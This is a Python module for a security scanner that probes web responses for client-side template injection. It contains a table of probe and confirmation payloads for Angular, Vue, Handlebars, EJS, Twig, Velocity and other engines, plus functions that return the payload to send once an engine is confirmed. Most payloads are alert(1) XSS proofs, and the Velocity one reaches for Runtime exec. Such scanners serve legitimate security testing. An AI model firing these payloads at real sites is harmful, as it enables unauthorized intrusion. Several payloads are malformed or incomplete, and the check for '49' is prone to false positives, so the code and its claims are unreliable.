"""Template-injection -> XSS detection.

Modern front-end frameworks render `{{ }}` / `<%= %>` / `*{ }` templates
on the CLIENT.  If user input lands inside a template string and the
framework compiles it, an attacker can inject template syntax that
executes arbitrary JS -- this is "client-side SSTI" and is frequently
misclassified as plain XSS.

Frameworks covered:
  * Angular ({{ constructor }} / [prop] / (event) bindings)
  * Vue ({{ }} / v-html / :prop bindings)
  * Mustache / Handlebars ({{ }} / {{{ }}} -- triple braces = raw HTML)
  * Lodash template (<%= %>)
  * Underscore (<%= %>)
  * EJS client-side (<%= %>)

The detection is two-stage:
  1. Inject a marker template expression (e.g. {{7*7}}).
  2. If the response reflects it verbatim, send a confirmation payload
     that produces a value ONLY the framework's template compiler would
     yield (e.g. {{7*7}} -> 49 in the rendered output).
"""
from __future__ import annotations

# Each entry: (framework, probe_payload, expected_rendered_value, confirm_payload)
# - probe_payload: the template expression to inject.
# - expected_rendered_value: what the framework produces when it compiles
#   the probe.  If we see this in the rendered response, the template
#   engine is executing user input.
# - confirm_payload: a payload that triggers XSS via the framework's
#   native sink once we've confirmed the engine runs.
TEMPLATES: list[tuple[str, str, str, str]] = [
    # Angular / AngularJS
    ("AngularJS",
     "{{7*7}}",
     "49",
     "{{constructor.constructor('alert(1)')()}}"),
    ("Angular",
     "{{7*7}}",
     "49",
     "{{constructor.constructor('alert(1)')()}}"),
    # Vue.js (default delimiters)
    ("Vue",
     "{{7*7}}",
     "49",
     "{{_c('img',{attrs:{src:x,onerror:alert(1)}})}"),
    # Mustache / Handlebars (triple braces = raw HTML)
    ("Mustache",
     "{{7*7}}",
     "49",
     "<img src=x onerror=alert(1)>"),  # via {{{payload}}}
    ("Handlebars",
     "{{7*7}}",
     "49",
     "{{#with 'constructor.constructor(\"alert(1)\")()'}}{{.}}{{/with}}"),
    # Lodash / Underscore / EJS template
    ("Lodash/Underscore",
     "<%=7*7%>",
     "49",
     "<%=alert(1)%>"),
    # EJS
    ("EJS",
     "<%=7*7%>",
     "49",
     "<%=alert(1)%>"),
    # Pug (jade) client-side
    ("Pug",
     "#{7*7}",
     "49",
     "img(onerror='alert(1)')"),
    # DoT.js
    ("DoT",
     "{{=7*7}}",
     "49",
     "{{=alert(1)}}"),
    # Dust.js
    ("Dust",
     "{7*7}",
     "49",
     "{alert(1)}"),
    # Jade (legacy)
    ("Jade",
     "#{7*7}",
     "49",
     "img(onerror='alert(1)')"),
    # Jinja2 (server-side, but reflected in client templates sometimes)
    ("Jinja2",
     "{{7*7}}",
     "49",
     "{{''.constructor.constructor('alert(1)')()}}"),
    # Twig
    ("Twig",
     "{{7*7}}",
     "49",
     "{{_self.env.registerUndefinedFilterCallback('alert')}}{{_self.env.getFilter('1')}}"),
    # Freeswitcher / Velocity / Thymeleaf patterns occasionally seen
    ("Velocity",
     "#set($x=7*7)$x",
     "49",
     "#set($e='exp')$e.class.forName('java.lang.Runtime').getMethod('exec','$e')"),
]


def probes() -> list[tuple[str, str, str]]:
    """Return [(framework, probe_payload, expected_value), ...]"""
    return [(fw, probe, val) for fw, probe, val, _ in TEMPLATES]


def confirm_payload_for(framework: str) -> str | None:
    """Return the XSS-triggering payload for a confirmed framework."""
    for fw, _, _, confirm in TEMPLATES:
        if fw == framework:
            return confirm
    return None


def detect_rendered(response_text: str, expected_value: str) -> bool:
    """Check whether the rendered response contains the expected value.

    The probe `{{7*7}}` should be reflected VERBATIM if no template engine
    runs, or RENDERED to `49` if the engine runs.  We detect the latter.
    """
    if not response_text or not expected_value:
        return False
    return expected_value in response_text


def detect_unrendered(response_text: str, probe: str) -> bool:
    """Check whether the probe was reflected verbatim (no engine ran).

    This is also useful: it confirms the page doesn't sanitize `{{ }}`,
    so an attacker could still attempt framework-specific bypasses.
    """
    if not response_text or not probe:
        return False
    return probe in response_text


def analyze(response_text: str) -> dict:
    """Analyze response for evidence of each template engine.

    Returns: {
        framework: {
            "probe_reflected":  bool,  # probe present verbatim
            "probe_rendered":   bool,  # expected value present (engine runs!)
            "confirm_payload":  str,   # the XSS payload to send next
        },
        ...
    }
    """
    out = {}
    for fw, probe, val, confirm in TEMPLATES:
        out[fw] = {
            "probe_reflected": detect_unrendered(response_text, probe),
            "probe_rendered": detect_rendered(response_text, val),
            "confirm_payload": confirm,
        }
    return out


def exploitable_frameworks(response_text: str) -> list[tuple[str, str]]:
    """Return [(framework, confirm_payload), ...] for engines confirmed
    to be rendering user input."""
    out = []
    for fw, probe, val, confirm in TEMPLATES:
        if detect_rendered(response_text, val):
            out.append((fw, confirm))
    return out
